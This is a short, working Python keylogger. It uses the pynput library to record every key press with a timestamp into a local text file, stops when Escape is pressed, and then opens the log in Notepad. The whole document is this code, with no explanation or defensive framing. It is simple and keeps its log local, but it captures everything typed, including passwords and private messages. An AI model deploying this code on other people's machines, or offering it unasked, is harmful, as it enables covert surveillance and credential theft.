from pynput.keyboard import Key, Listener
from datetime import datetime
import subprocess 

log_file = "key_log_with_time.txt"

def log_key(key):
    key = str(key).replace("'", "")  
    if key == 'Key.space':  
        key = ' '  
    elif 'Key' in key:  
        key = ''  

    
    current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

  
    with open(log_file, 'a') as file:
        file.write(f"[{current_time}] {key}\n")

def stop_keylogger(key):
    if key == Key.esc:  
        return False


with Listener(on_press=log_key, on_release=stop_keylogger) as listener:
    listener.join()


subprocess.run(['notepad.exe', log_file])  
